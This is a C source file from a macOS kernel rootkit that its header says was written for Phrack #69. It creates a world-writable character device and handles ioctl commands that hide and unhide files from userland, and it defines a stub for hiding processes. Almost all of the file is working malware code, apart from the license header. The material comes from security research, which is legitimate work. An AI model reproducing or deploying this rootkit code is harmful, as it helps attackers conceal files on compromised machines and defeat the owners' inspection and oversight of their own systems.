/*
 *   _____   _                          ___     _      _  _     _              __ _
 *  |_   _| | |_      ___      o O O   | __|   | |    | || |   (_)    _ _     / _` |
 *    | |   | ' \    / -_)    o        | _|    | |     \_, |   | |   | ' \    \__, |
 *   _|_|_  |_||_|   \___|   TS__[O]  _|_|_   _|_|_   _|__/   _|_|_  |_||_|   |___/
 * _|"""""|_|"""""|_|"""""| {======|_| """ |_|"""""|_| """"|_|"""""|_|"""""|_|"""""|
 * "`-0-0-'"`-0-0-'"`-0-0-'./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *            ___      _
 *    o O O  / __|    (_)      _ _    __     _  _     ___
 *   o      | (__     | |     | '_|  / _|   | +| |   (_-<
 *  TS__[O]  \___|   _|_|_   _|_|_   \__|_   \_,_|   /__/_
 *  {======|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|
 * ./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *
 * And now for something completely different...
 *
 * A Mountain Lion rootkit for Phrack #69!
 *
 * Copyright (c) fG!, 2012, 2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * ioctl.c
 *
 * Install character device & functions to process the ioctl events from userland
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include "ioctl.h"
#include <sys/types.h>
#include <sys/systm.h>
#include <sys/conf.h>
#include <libkern/libkern.h>
#include <miscfs/devfs/devfs.h>

#include "uthash.h"
#include "my_data_definitions.h"
#include "configuration.h"
#include "hide_files.h"

static void cmd_hide_file(char* to_hide);
static void cmd_unhide_file(char* to_unhide);
static int control_open(dev_t dev, int flags, int devtype, struct proc *p);
static int control_close(dev_t dev, int flags, int devtype, struct proc *p);
static int control_ioctl(dev_t dev, u_long cmd, caddr_t data, int flag, struct proc *p);

/* ioctls definition - this must be shared with userland utility */
// oh, these are the same as Crisis :X
typedef char pathname_t[MAXPATHLEN];
#define FLYINGCIRCUSIOHIDEFILE  _IOW('F', 0x807e7fc2, pathname_t)
#define FLYINGCIRCUSIOHIDEPROC  _IOW('F', 0x80ff6fdc, pid_t)
#define FLYINGCIRCUSIOUNHIDEFILE _IOW('F', 0x807e7fc3, pathname_t)

// structure for our character device callbacks
static struct cdevsw g_rk_device_cdevsw =
{
    control_open,               /* open */
    control_close,              /* close */
    (d_read_t*)&nulldev,        /* read */
    (d_write_t*)&nulldev,       /* write */
    control_ioctl,              /* ioctl */
    eno_stop,                   /* stop */
    eno_reset,                  /* reset */
    NULL,                       /* tty's */
    eno_select,                 /* select */
    eno_mmap,                   /* mmap */
    eno_strat,                  /* strategy */
    eno_getc,                   /* getc */
    eno_putc,                   /* putc */
    0                           /* type */
};

// global data
int g_devindex = -1;
void *g_devnode = NULL;

# pragma mark The functions to install and remove the character device

kern_return_t
install_rootkit_device(void)
{
    g_devindex = cdevsw_add(-1, &g_rk_device_cdevsw);
    if (g_devindex == -1)
    {
#if DEBUG
        //moony_modify//printf("[ERROR] cdevsw_add failed!\n");
#endif
        return KERN_FAILURE;
    }
    // create the device
    g_devnode = devfs_make_node(makedev(g_devindex, 0), DEVFS_CHAR, UID_ROOT, GID_WHEEL, 0666, CHARACTER_DEVICE);
    if (g_devnode == NULL)
    {
#if DEBUG
        //moony_modify//printf("[ERROR] devfs_make_node() failed\n");
#endif
        return KERN_FAILURE;
    }
    return KERN_SUCCESS;
}

kern_return_t
remove_rootkit_device(void)
{
    if (g_devnode != NULL) devfs_remove(g_devnode);
    
    if (g_devindex != -1) cdevsw_remove(g_devindex, &g_rk_device_cdevsw);
    
    return KERN_SUCCESS;
}

#pragma mark The callbacks that handle ioctl requests from userland

static int
control_open(dev_t dev, int flags, int devtype, struct proc *p)
{
    return 0;    
}

static int
control_close(dev_t dev, int flags, int devtype, struct proc *p)
{
    return 0;
}

// @param   Dev         The device number (major+minor).
// @param   cmd         The IOCtl command.
// @param   data        Pointer to the data (if any it's a SUPDRVIOCTLDATA (kernel copy)).
// @param   fflag       Flag saying we're a character device (like we didn't know already).
// @param   p           The process issuing this request.
static int
control_ioctl(dev_t dev, u_long cmd, caddr_t data, int flag, struct proc *p)
{
    // XXX: add some kind of authentication here
    //      encrypt the data for example
    switch (cmd) {
        case FLYINGCIRCUSIOHIDEFILE:
        {
            cmd_hide_file((char*)data);
            break;   
        }
        case FLYINGCIRCUSIOUNHIDEFILE:
        {
            cmd_unhide_file((char*)data);
            break;
        }
        case FLYINGCIRCUSIOHIDEPROC:
        {
            break;
        }
        default:
            break;
    }
        
    return 0;
}

#pragma mark The commands

/*
 * command to hide files/folders
 * ASSUMPTION: input must be always the full path to the file or folder to hide
 *
 * XXX: needs more work to accept different input cases
 *      but hey, it's a rootkit, not for general public usage
 */
static void
cmd_hide_file(char* to_hide)
{
#if DEBUG
    //moony_modify//printf("[DEBUG] Received command to hide file %s\n", to_hide);
#endif
    add_file_to_hide(to_hide);
}

/*
 * command to unhide files/folders
 */
static void
cmd_unhide_file(char* to_unhide)
{
#if DEBUG
    //moony_modify//printf("[DEBUG] Received command to unhide file %s\n", to_unhide);
#endif
    del_file_to_hide(to_unhide);
}


